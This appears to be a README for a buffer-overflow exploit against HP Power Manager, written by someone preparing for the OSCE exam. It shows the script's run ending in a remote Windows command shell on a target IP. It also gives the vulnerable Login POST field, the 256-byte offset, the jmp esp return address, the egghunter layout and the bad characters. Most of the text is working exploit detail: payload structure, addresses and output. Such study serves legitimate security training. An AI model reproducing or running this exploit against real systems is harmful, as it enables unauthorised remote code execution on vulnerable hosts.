# HP-Power-Manager

    dev@ubuntu:~# python HPPowerManager.py 192.168.126.209
    [+] Trying to exploit 192.168.126.209
    [+] Sending payload
    [+] Trying to connect to target
    [+] Please wait to thirty seconds...

    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:\WINDOWS\system32>

An overflow in the Login of the post request  
    HtmlOnly=true&Login=admin{}&Password=admin&loginButton=Submit+Login

Sending 256 bytes of data will trigger this overflow. 
Was just studying the exploit originally created by ryujin , which you can find here: https://www.exploit-db.com/exploits/10099/  
Have to prep for that OSCE Exam yo!

There was also more bytes that could crash the service which leads to an SEH overflow, however, all the addresses had a nullbyte in them.   
Interestingly, used the nullbyte to help me find the amount of this crash as so:

    crash = "A" * 256
    crash += pack('<L', 0x7608BCCF)
    crash += "B" * 20
    crash += egghunter
    crash += '\x00'

Without the null, I wasn't able to hit my breakpoint after 256 bytes

Just used the same address as ryujin did: 

    Message=  0x7608bccf : jmp esp |  {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v6.02.3104.0 (C:\Program Files\HP\Power Manager\MSVCP60.dll)
    
There were no bad characters with the exception of '\x00'

Useful Notes:  
256 bytes to crash the app  
0x7608bccf : jmp esp in MSVCP60.dll  
egghunter : haha  
badchars : \x00  

